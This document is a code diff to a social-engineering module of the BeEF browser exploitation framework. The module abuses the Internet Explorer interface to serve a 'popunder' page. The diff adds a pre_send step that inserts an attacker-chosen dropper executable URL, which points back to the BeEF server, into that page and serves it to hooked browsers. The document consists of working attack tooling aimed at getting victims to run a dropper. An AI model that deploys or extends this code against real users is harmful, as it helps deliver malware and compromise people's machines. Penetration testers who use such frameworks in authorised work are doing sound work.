@@ -12,11 +12,26 @@ class Ui_abuse_ie < BeEF::Core::Command
 
 	def self.options
 		return [
-        {'name' => 'dropper_url', 'ui_label' => 'Executable URL (must be signed)', 'value' => 'http://dropper_url/dropper.exe'}
+        {'name' => 'exe_url', 'ui_label' => 'Executable URL (MUST be signed)', 'value' => 'http://beef_server:beef_port/yourdropper.exe'}
 		]
   end
 
-  #TODO pre-execute -> read popunder.html, replace placeholder, and serve it mounting a new URL
+  def pre_send
+    begin
+
+      @datastore.each do |input|
+        if input['name'] == "exe_url"
+          @exe_url = input['value']
+        end
+      end
+
+      popunder = File.read("#{$root_dir}/modules/social_engineering/ui_abuse_ie/popunder.html")
+      body = popunder.gsub("__URL_PLACEHOLDER__", @exe_url)
+      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_raw('200', {'Content-Type'=>'text/html'}, body, "/underpop.html", -1)
+    rescue Exception => e
+      print_error "Something went wrong executing Ui_abuse_ie::pre_send, exception: #{e.message}"
+    end
+  end
 
 	def post_execute
 		content = {}
